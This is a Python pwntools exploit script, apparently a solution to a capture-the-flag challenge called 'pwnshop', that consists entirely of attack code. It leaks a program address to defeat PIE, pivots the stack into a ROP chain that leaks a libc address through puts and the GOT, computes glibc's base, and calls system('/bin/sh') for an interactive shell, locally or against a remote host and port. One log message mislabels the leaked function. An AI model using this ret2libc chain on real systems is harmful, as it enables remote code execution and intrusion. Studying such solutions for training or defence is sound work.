#!/usr/bin/env python3

from pwn import *

context.binary = 'pwnshop'


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1].split(':')
    return remote(host, int(port))


def main():
    p = get_process()

    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'What do you wish to sell? ', b'asdf')
    p.sendafter(b'How much do you want for it? ', b'A' * 8)

    p.recvuntil(b'? ')
    details_global_addr = u64(p.recvuntil(b'?')[8:-1].ljust(8, b'\0'))
    log.info(f'Leaked details_global address: {hex(details_global_addr)}')

    elf_addr = details_global_addr - 0x40c0
    log.success(f'ELF base address: {hex(elf_addr)}')

    sub_rsp_0x28_ret = elf_addr + 0x1219
    pop_rdi_ret      = elf_addr + 0x13c3

    setvbuf_got_addr = elf_addr + 0x4048
    puts_plt_addr    = elf_addr + 0x1030
    buy_addr         = elf_addr + 0x132a

    payload  = b'A' * 8 * 5
    payload += p64(pop_rdi_ret)
    payload += p64(setvbuf_got_addr)
    payload += p64(puts_plt_addr)
    payload += p64(buy_addr)
    payload += p64(sub_rsp_0x28_ret)

    p.sendlineafter(b'> ', b'1')
    p.sendafter(b'Enter details: ', payload)

    setvbuf_addr = u64(p.recvline().strip().ljust(8, b'\0'))
    log.info(f'Leaked strcmp() address: {hex(setvbuf_addr)}')

    setvbuf_offset = 0x6fe80   # 0x84ce0
    system_offset  = 0x453a0   # 0x52290
    bin_sh_offset  = 0x18ce17  # 0x1b45bd

    glibc_addr = setvbuf_addr - setvbuf_offset
    log.success(f'Glibc base address: {hex(glibc_addr)}')

    system_addr = glibc_addr + system_offset
    bin_sh_addr = glibc_addr + bin_sh_offset

    payload  = b'A' * 8 * 5
    payload += p64(pop_rdi_ret)
    payload += p64(bin_sh_addr)
    payload += p64(pop_rdi_ret + 1)
    payload += p64(system_addr)
    payload += p64(sub_rsp_0x28_ret)

    p.sendafter(b'Enter details: ', payload)
    p.interactive()


if __name__ == '__main__':
    main()
